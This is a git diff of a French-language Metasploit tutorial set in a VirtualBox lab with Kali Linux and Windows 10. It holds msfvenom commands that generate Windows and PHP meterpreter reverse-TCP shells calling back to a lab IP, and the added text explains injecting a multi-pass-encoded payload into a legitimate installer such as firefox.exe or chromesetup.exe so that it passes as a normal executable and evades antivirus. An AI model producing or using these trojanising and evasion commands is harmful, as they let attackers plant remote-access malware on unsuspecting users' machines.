@@ -6,6 +6,11 @@
 - windows 10 dans virtual
 
 
+## dans virtul box :
+
+### dans la configuration de kali linux choisisez le reseau privé hote qui permettra de faire les commande tranquillementL.
+
+<img width="1455" height="771" alt="image" src="https://github.com/user-attachments/assets/60365132-93fa-4f21-ac70-2e24980db571" />
 
 
 ## voilà une architecture de metasploite
@@ -230,6 +235,13 @@ msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe
 ````bash
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw > /home/kali/Desktop/shell.php
 ````
+
+## dans virtual box :
+
+### dans kali linux changer la configuration du reseau en acces par pont , cela permettra de telecharger les fichier exe comme chrome ou firefox, vous pourrez inserrez votre malwar dans un vrai exe connu comme chromesetup.exe notament avec cette commande. vous serrez le plus discret avec les anti virus en vous faisant passer pour un executable tout a fait normal ( en conservant sa signature)
+
 ````bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=3000 -f exe -e x86/shikata_ga_nai -i 10 -k -x /root/Bureau/Outils/firefox.exe -o /home/kali/Desktop/fichier.exe
 ````
+
+<img width="1392" height="733" alt="image" src="https://github.com/user-attachments/assets/8f901a2e-b4c9-4794-b8e1-8bd1ea27088a" />
